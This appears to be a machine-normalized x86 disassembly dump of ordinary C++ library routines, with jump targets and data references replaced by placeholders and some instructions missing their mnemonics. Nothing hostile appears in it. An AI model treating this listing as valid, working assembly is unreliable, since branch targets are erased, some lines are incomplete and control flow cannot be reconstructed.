mov eax edi
shr eax 0x2
cmp ecx eax
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
push ebx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
sub eax ecx
call sub_410d1c
mov eax [ esi + 0x4 ]
mov eax [ eax + ebx * 4 ]
and edi 0x3
lea edi [ eax + edi * 4 ]
pop ebx
test edi edi
je r-xdata
push 0x4
pop eax
call sub_411eff
mov ecx [ esi + 0x4 ]
mov [ ecx + ebx * 4 ] eax
inc [ esi + 0x10 ]
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ edi ] eax
sub_410d1c
push ebp
mov ebp esp
sub esp 0xc
mov eax [ esi + 0x8 ]
push ebx
push edi
mov edx 0xfffffff
xor edi edi
mov ecx edx
inc edi
sub ecx eax
mov [ ebp - 0x8 ] edi
cmp ecx edi
jae r-xdata
mov ecx eax
shr ecx 0x1
cmp ecx 0x8
jae r-xdata
push r--data
call sub_446a95
cmp ecx edi
jbe r-xdata
push 0x8
pop ecx
mov ebx [ esi + 0xc ]
shr ebx 0x2
add eax [ ebp - 0x8 ]
jne r-xdata
sub edx ecx
cmp eax edx
ja r-xdata
call sub_411f41
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ecx
mov ebx edx
push eax
shl ebx 0x2
lea eax [ ebx + ecx ]
push ecx
call sub_413eaa
mov ecx [ esi + 0x4 ]
push [ ebp - 0xc ]
lea eax [ edi + ecx ]
push [ ebp - 0x4 ]
add ecx ebx
push ecx
call sub_413eaa
mov ecx [ ebp - 0x8 ]
add esp 0x18
mov edi eax
test ecx ecx
je r-xdata
push [ ebp - 0xc ]
lea eax [ edi + ecx ]
push ecx
mov edi edx
call sub_413eaa
add esp 0xc
sub edi ebx
mov edx eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
push [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edi ebx
shl edi 0x2
add edx edi
lea eax [ ecx + eax * 4 ]
add ecx edi
push edx
push ecx
call sub_413eaa
mov edx [ ebp - 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
cmp ebx edx
ja r-xdata
mov eax [ esi + 0x4 ]
pop edi
pop ebx
test eax eax
je r-xdata
xor eax eax
[ edi ]
test ebx ebx
je r-xdata
mov ecx edi
xor eax eax
mov edi edx
[ edi ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
add [ esi + 0x8 ] eax
leave
retn
push eax
call sub_424fc7
pop ecx
mov edi [ ebp - 0x4 ]
mov ecx ebx
jmp r-xdata
sub_410e55
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44e247
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd0 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
and [ esp + 0x14 ] 0x0
mov eax [ ebp + 0xc ]
mov ebx ecx
mov ecx [ edi ]
mov [ esp + 0x14 ] ecx
lea ecx [ ebx + 0x8 ]
push eax
mov esi edx
push ecx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] edi
mov [ esp + 0x2c ] eax
mov [ esp + 0x18 ] ecx
call sub_40d1fb
mov edx [ esp + 0x24 ]
cmp [ eax ] edx
jne r-xdata
mov eax [ edi ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
push 0x2f
pop eax
sub ecx 0x5b
je r-xdata
je r-xdata
xor eax eax
lea edi [ esp + 0x14 ]
stosb [ edi ]
push [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push esi
call sub_412a54
dec eax
je r-xdata
inc eax
push 0x7
mov [ edi ] eax
pop eax
dec ecx
je r-xdata
push 0xa
mov eax r--data
lea esi [ esp + 0x70 ]
call sub_4038f9
mov [ esp + 0xd8 ] 0x1
push 0x228
cmp ecx 0x24
je r-xdata
xor eax eax
lea edi [ esp + 0x14 ]
stosb [ edi ]
push [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push esi
call sub_412a76
jmp r-xdata
sub eax 0x8
je r-xdata
cmp eax 0x25
jg r-xdata
je r-xdata
inc eax
mov [ edi ] eax
cmp eax edx
je r-xdata
dec ecx
dec ecx
je r-xdata
push 0x23
cmp ecx 0x28
je r-xdata
pop ecx
xor eax eax
mov [ esi ] 0x1
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ edi ] eax
sub eax 0x26
je r-xdata
je r-xdata
push esi
call sub_41291c
jmp r-xdata
cmp eax 0x6
jg r-xdata
push 0x2
pop eax
mov edx edi
call sub_40d26c
jmp r-xdata
push 0x22
jmp r-xdata
sub ecx 0x1e
je r-xdata
sub eax 0x21
je r-xdata
push 0x3
jmp r-xdata
cmp ecx 0x29
je r-xdata
mov eax esi
xor eax eax
lea edi [ esp + 0x18 ]
stosb [ edi ]
push [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push esi
call sub_412aba
jmp r-xdata
pop ecx
sub eax 0x7
je r-xdata
je r-xdata
cmp eax 0x20
jg r-xdata
mov edx [ esp + 0x24 ]
jmp r-xdata
inc eax
mov [ edi ] eax
pop eax
jmp r-xdata
push 0x5
jmp r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_412982
jmp r-xdata
dec eax
je r-xdata
inc eax
mov [ edi ] eax
pop eax
jmp r-xdata
push 0x4
jle r-xdata
push edx
push edi
push esi
mov ecx ebx
call sub_413830
jmp r-xdata
sub eax 0xb
je r-xdata
sub eax 0x0
je r-xdata
push [ esp + 0x10 ]
mov edi esi
push [ ebx + 0x210 ]
call sub_4129e8
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x2b
jle r-xdata
lea eax [ esp + 0x90 ]
push eax
push ebx
mov ebx edx
mov eax edi
call sub_41389e
mov ecx [ esp + 0x1c ]
push [ esp + 0x10 ]
mov [ esp + 0xdc ] 0x2
mov edx [ ecx + 0x210 ]
push edx
mov ecx eax
mov ebx esi
call sub_4127ed
pop ecx
pop ecx
lea ecx [ esp + 0x90 ]
jmp r-xdata
dec eax
jne r-xdata
push edx
lea eax [ esp + 0xb0 ]
push eax
mov edx edi
mov ecx ebx
call sub_412510
and [ esp + 0xd8 ] 0x0
mov ebx [ ebx + 0x210 ]
push [ esp + 0x10 ]
mov ecx eax
push ebx
mov ebx esi
call sub_4127ed
pop ecx
pop ecx
lea ecx [ esp + 0xac ]
dec eax
je r-xdata
push [ esp + 0x10 ]
mov edi esi
push [ ebx + 0x210 ]
call sub_412a1e
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x2e
jne r-xdata
or [ esp + 0xd8 ] 0xffffffff
push 0x0
push 0x1
call sub_40487c
jmp r-xdata
push 0x2
mov eax r--data
lea esi [ esp + 0x4c ]
call sub_4038f9
mov [ esp + 0xd8 ] 0x3
push 0x237
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ ebx + 0x210 ]
push esi
call sub_41289c
jmp r-xdata
dec eax
je r-xdata
lea edi [ esp + 0x18 ]
stosb [ edi ]
push [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push esi
call sub_412a98
jmp r-xdata
inc eax
mov [ edi ] eax
xor eax eax
inc eax
jmp r-xdata
push r--data
push r--data
push eax
call sub_405e22
push edi
lea eax [ esp + 0x3c ]
push eax
push ebx
mov eax edx
call sub_412adc
mov esi eax
lea edi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x34 ]
sub eax 0x0
je r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov esi [ esp + 0x20 ]
mov eax ebx
push [ eax + 0x210 ]
mov al [ esp + 0x2c ]
call sub_412bc4
jmp r-xdata
dec eax
je r-xdata
push [ esp + 0x24 ]
mov ecx ebx
push edi
push esi
call sub_412c40
jmp r-xdata
jmp r-xdata
mov esi [ esp + 0x20 ]
mov eax ebx
push [ eax + 0x210 ]
mov eax [ esp + 0x30 ]
call sub_412b99
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx ]
movzx edx [ eax ]
inc eax
mov [ ecx ] eax
push edx
mov eax ebx
call sub_41202b
push [ esp + 0x20 ]
mov cl al
mov eax [ esp + 0x34 ]
call sub_412c03
mov eax [ esp + 0x24 ]
pop ecx
jmp r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x20 ]
mov ecx [ esp + 0xd0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb8 ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn 0x8
sub_411262
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push ebx
push [ ebp + 0x8 ]
mov esi eax
mov edi esi
call sub_40d1fb
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi ]
movsx ecx [ eax ]
sub ecx 0x2a
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
dec ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov al 0x1
mov eax [ esi ]
cmp [ eax ] 0x3f
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
jmp r-xdata
sub ecx 0x14
je r-xdata
inc eax
mov [ esi ] eax
mov [ ebx + 0x8 ] 0x0
or [ eax + 0x4 ] 0xffffffff
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x1
jmp r-xdata
sub ecx 0x3c
jne r-xdata
push [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov [ ebx + 0x8 ] 0x1
inc [ esi ]
mov edi esi
call sub_40d1fb
mov ecx [ ebp + 0xc ]
cmp [ eax ] ecx
je r-xdata
push ebx
push [ ebp + 0x8 ]
inc eax
mov [ esi ] eax
call sub_40d1fb
mov edi [ eax ]
push 0x7fffffff
push [ ebp + 0x8 ]
push 0xa
pop eax
call sub_4139a9
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x4 ] eax
mov [ ecx ] eax
mov eax [ esi ]
cmp eax edi
je r-xdata
xor al al
cmp eax ebx
je r-xdata
push 0xc4
push r--data
push ebx
cmp cl 0x7d
push edi
sete al
push 0x6
mov ebx [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
inc eax
mov edi esi
mov [ esi ] eax
call sub_40d1fb
mov eax [ eax ]
push 0x7fffffff
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push 0xa
pop eax
call sub_4139a9
mov edi [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax [ esi ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
cmp [ eax ] 0x7d
jne r-xdata
push 0xa7
push r--data
mov ebx r--data
push ebx
mov edi r--data
push edi
push 0x6
push eax
call sub_403978
mov eax [ esi ]
mov cl [ eax ]
add esp 0x18
cmp cl 0x2c
jne r-xdata
mov eax [ edi ]
cmp [ edi + 0x4 ] eax
push 0xbc
push r--data
push ebx
sbb al al
push r--data
inc al
push 0x7
movzx eax al
jmp r-xdata
or [ edi + 0x4 ] 0xffffffff
jmp r-xdata
mov al 0x1
jmp r-xdata
push eax
call sub_403978
add esp 0x18
jmp r-xdata
push 0xb1
push r--data
mov ebx r--data
push ebx
push r--data
push 0x6
push eax
call sub_403978
mov eax [ ebp - 0x4 ]
add esp 0x18
cmp [ esi ] eax
jne r-xdata
sub_411465
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
leave
retn 0x4
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
call sub_40d76d
pop edi
sub_4114a7
push 0x4
mov eax sub_44b282
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4120ff
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4120c9
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4120ff
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_411528
push 0x4
mov eax sub_44b25c
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_41211e
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4120e1
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41211e
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4115d3
push 0x0
mov eax sub_44b236
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_41213d
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41213d
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41164a
push 0x0
mov eax sub_44b210
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ edi ] bl
call sub_41215c
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi [ ebp + 0xc ]
call sub_41215c
add eax 0x18
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4116bb
push 0x0
mov eax sub_44b1ea
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ edi ] bl
call sub_41217b
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi [ ebp + 0xc ]
call sub_41217b
add eax 0x18
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41172c
push 0x8
mov eax sub_44c45c
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x14
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_4121d8
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_413a67
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_411795
push 0x8
mov eax sub_44c420
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x14
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_4122a4
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_413ade
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4117fe
push 0x0
mov eax sub_44b1c4
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_41219a
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_41219a
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_411875
push 0x0
mov eax sub_44b19e
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_4121b9
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4121b9
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_4118fa
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
call sub_40fa5b
mov eax [ ebp + 0x8 ]
add [ ebp + 0x10 ] 0x4
add eax 0x4
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
pop ebp
retn
sub_411935
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
call sub_414101
add [ ebp + 0xc ] 0x4
add esi 0x4
mov eax [ ebp + 0xc ]
pop esi
pop ebp
retn
sub_41199c
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov edi esp
lea esi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
push ecx
movsd [ edi ] [ esi ]
push eax
lea eax [ ebp - 0xc ]
push eax
movsd [ edi ] [ esi ]
call sub_413ba2
add esp 0x18
pop edi
pop esi
leave
retn 0x8
sub_411a40
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x0
push 0x1
mov ecx esi
call sub_40487c
add esi 0x1c
pop esi
pop ebp
retn
sub_411a5e
push ebp
mov ebp esp
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_404e0f
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
add edi 0x20
add esi 0x20
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_411ac6
push ebp
mov ebp esp
cmp [ esi ] 0x0
mov al [ ebp + 0x8 ]
je r-xdata
push edi
movzx eax al
lea edi [ esi + 0x8 ]
call sub_411fdc
pop edi
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
sub_411af3
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn
sub_411b1d
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0xc ] 0x0
lea edi [ ebp - 0xb ]
stosd [ edi ]
stosw [ edi ]
mov ebx ecx
stosb [ edi ]
xor esi esi
mov al [ esi + r--data ]
mov ecx [ ebx + 0x204 ]
mov [ ebp - 0x10 ] al
push [ ebp - 0x10 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp + esi - 0xc ] al
inc esi
cmp esi 0x7
jb r-xdata
lea eax [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40655a
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_411b7d
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
mov [ ebx ] ecx
mov eax ebx
leave
retn 0x10
push esi
lea esi [ eax + 0x8 ]
push edi
pop edi
pop esi
inc ecx
mov [ ebp + 0x8 ] ecx
cmp ecx [ ebp + 0xc ]
jne r-xdata
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
movzx eax [ ecx ]
push [ ebp + 0x10 ]
push eax
call sub_413c31
mov ecx [ ebp + 0x8 ]
test al al
jne r-xdata
sub_411bbd
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
mov [ ebx ] ecx
mov eax ebx
leave
retn 0xc
push esi
lea esi [ eax + 0x8 ]
push edi
pop edi
pop esi
inc ecx
mov [ ebp + 0x8 ] ecx
cmp ecx [ ebp + 0xc ]
jne r-xdata
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0x4 ]
push eax
call sub_413c72
mov ecx [ ebp + 0x8 ]
test al al
jne r-xdata
sub_411bfa
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_413ca3
pop edi
leave
retn 0xc
sub_411c2b
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ esi + 0xc ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
inc [ edi + 0x1c ]
cmp [ edi + 0x1c ] 0x0
setg al
mov [ esi + 0x10 ] al
mov eax [ edi ]
call sub_408952
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x4
sub_411c68
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_413d40
pop edi
leave
retn 0xc
sub_411c99
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ edi ]
call sub_408952
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x4
sub_411cc3
push ebx
push esi
mov esi [ edx ]
imul esi esi 0x18
add esi [ eax + 0x4 ]
push edi
mov edi [ esi + 0xc ]
mov bl [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
mov [ esi + 0x14 ] 0x0
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
test al al
je r-xdata
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] bl
xor al al
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_411cf9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ edx ]
imul esi esi 0x18
mov ebx eax
add esi [ ebx + 0x4 ]
mov al [ esi + 0x14 ]
mov [ ebp - 0x1 ] al
test al al
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebx ]
push edi
sete al
mov [ esi + 0x14 ] al
xor eax eax
lea edi [ ebp - 0x5 ]
stosb [ edi ]
push [ ebp - 0x5 ]
mov edi edx
push ecx
call sub_413dcd
pop edi
test al al
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + 0x14 ] al
xor al al
mov al 0x1
jmp r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_411d55
push ebp
mov ebp esp
mov edx esi
call sub_408a83
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
and [ esi + 0xc ] 0x0
sub_411d8d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ edx ]
imul esi esi 0x18
mov ebx eax
add esi [ ebx + 0x4 ]
mov al [ esi + 0x14 ]
mov [ ebp - 0x1 ] al
test al al
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebx ]
push edi
sete al
mov [ esi + 0x14 ] al
xor eax eax
lea edi [ ebp - 0x5 ]
stosb [ edi ]
push [ ebp - 0x5 ]
mov edi edx
call sub_413e13
pop edi
test al al
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + 0x14 ] al
xor al al
mov al 0x1
jmp r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_411de8
push ebp
mov ebp esp
mov edx esi
call sub_408a83
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
and [ esi + 0xc ] 0x0
sub_411e20
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413e54
pop edi
leave
retn 0x8
sub_411e3e
push ebp
